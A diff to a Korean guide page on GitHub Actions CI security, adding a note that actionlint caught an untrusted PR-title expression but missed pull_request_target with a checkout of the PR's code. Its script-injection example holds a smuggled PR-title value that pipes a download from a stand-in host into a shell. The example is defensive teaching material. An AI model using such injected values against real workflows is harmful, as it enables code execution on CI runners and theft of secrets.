@@ -4,7 +4,7 @@ order: 5
 level: 심화
 summary: "GitHub-hosted 와 self-hosted 러너의 선택 기준과 self-hosted 의 격리·에페메럴·오토스케일(ARC), 장기 비밀 없이 클라우드에 인증하는 OIDC 의 동작(토큰 클레임·신뢰 정책·subject 조건), GITHUB_TOKEN 의 permissions 최소화, pull_request_target 과 포크 PR 의 코드 실행 위험, 시크릿 마스킹의 한계와 유출 경로, 서드파티 액션을 SHA 로 고정하고 허용 목록으로 제한하는 법, 이 저장소 CI 의 보안 점검"
 tags: [self-hosted runner, ARC, OIDC, GITHUB_TOKEN, permissions, pull_request_target, 시크릿, 액션 핀 고정, SHA, 공급망]
-experiments: []
+experiments: [gha-workflow-lint]
 ---
 
 CI 는 **코드를 실행하는 권한을 가진 시스템**이다. 저장소의 시크릿, 클라우드 자격 증명, 배포 권한이 모두 러너에서 만난다. 그래서 CI 보안은 세 질문으로 요약된다: **누가**(어떤 트리거·어떤 코드가) **어디서**(어떤 러너에서) **무엇으로**(어떤 토큰·권한으로) 실행되는가.
@@ -123,7 +123,7 @@ steps:
 
 같은 계열의 함정:
 
-- **스크립트 인젝션**: `run: echo "${{ github.event.pull_request.title }}"` — 제목에 `"; curl evil | sh; "` 를 넣으면 실행된다. 입력은 **환경 변수**로 받는다: `env: TITLE: ${{ ... }}` 후 `"$TITLE"`.
+- **스크립트 인젝션**: `run: echo "${{ github.event.pull_request.title }}"` — 제목에 `"; curl evil | sh; "` 를 넣으면 실행된다. 입력은 **환경 변수**로 받는다: `env: TITLE: ${{ ... }}` 후 `"$TITLE"`. 이 패턴은 기계가 잡을 수 있다 — 실험 [gha-workflow-lint](/github-actions/lab/gha-workflow-lint)에서 actionlint 가 `"github.event.pull_request.title" is potentially untrusted` 로 정확히 짚었다. 반대로 `pull_request_target` + PR 코드 checkout 자체는 문법상 정상이라 actionlint 가 **잡지 못했다** — 의미 검사는 zizmor 같은 보안 린터와 리뷰의 몫이다.
 - **캐시 포이즈닝**: 포크 PR 이 기본 브랜치 캐시 키에 악성 파일을 넣어 두면 main 의 잡이 그것을 복원한다. 캐시 키에 브랜치를 포함하거나 PR 에서 `cache-to` 를 끈다.
 - **아티팩트 신뢰**: 이전 잡의 아티팩트를 "검증된 것" 으로 간주하지 않는다.
 
